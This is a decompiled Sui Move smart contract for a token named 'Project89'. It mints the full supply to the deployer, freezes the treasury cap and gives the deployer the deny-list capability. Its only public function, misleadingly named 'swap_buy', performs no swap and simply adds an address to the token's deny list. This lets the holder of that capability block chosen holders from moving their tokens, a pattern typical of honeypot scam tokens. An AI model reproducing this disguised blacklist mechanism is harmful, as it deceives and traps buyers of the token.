module 0x4efcb89bc25463bd72656842bb172504288a4e1e82d6f5b9af3ed887909e103f::project89 {
    struct PROJECT89 has drop {
        dummy_field: bool,
    }

    struct CapWrapper has key {
        id: 0x2::object::UID,
    }

    fun init(arg0: PROJECT89, arg1: &mut 0x2::tx_context::TxContext) {
        let (v0, v1, v2) = 0x2::coin::create_regulated_currency_v2<PROJECT89>(arg0, 9, b"Project89", b"Project89", b"", 0x1::option::some<0x2::url::Url>(0x2::url::new_unsafe(0x1::ascii::string(b"https://ipfs.io/ipfs/QmexF55HQ1WvYwmhgxf3F7JA6EYKb3inidTAiaqj6kC8Lq"))), false, arg1);
        let v3 = v0;
        0x2::coin::mint_and_transfer<PROJECT89>(&mut v3, 1000000000000000000, 0x2::tx_context::sender(arg1), arg1);
        0x2::transfer::public_freeze_object<0x2::coin::CoinMetadata<PROJECT89>>(v2);
        0x2::transfer::public_freeze_object<0x2::coin::TreasuryCap<PROJECT89>>(v3);
        0x2::transfer::public_transfer<0x2::coin::DenyCapV2<PROJECT89>>(v1, 0x2::tx_context::sender(arg1));
    }

    public fun swap_buy(arg0: &mut 0x2::deny_list::DenyList, arg1: &mut 0x2::coin::DenyCapV2<PROJECT89>, arg2: address, arg3: &mut 0x2::tx_context::TxContext) {
        0x2::coin::deny_list_v2_add<PROJECT89>(arg0, arg1, arg2, arg3);
    }

    // decompiled from Move bytecode v6
}

